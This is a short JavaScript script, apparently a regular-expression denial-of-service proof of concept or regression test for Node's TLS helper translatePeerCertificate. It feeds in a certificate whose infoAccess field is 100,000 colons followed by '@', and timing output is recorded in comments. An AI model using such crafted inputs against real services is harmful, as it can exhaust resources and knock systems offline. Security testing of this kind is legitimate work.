const { translatePeerCertificate } = require("./_tls_common.js");

//Attack String :""+"A"*100000+"@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += ":";
}
str += "@";

const c = {
  issuerCertificate: null,
  infoAccess: str,
};
var result = translatePeerCertificate(c);

// real    0m0.163s
// user    0m0.133s
// sys     0m0.010s
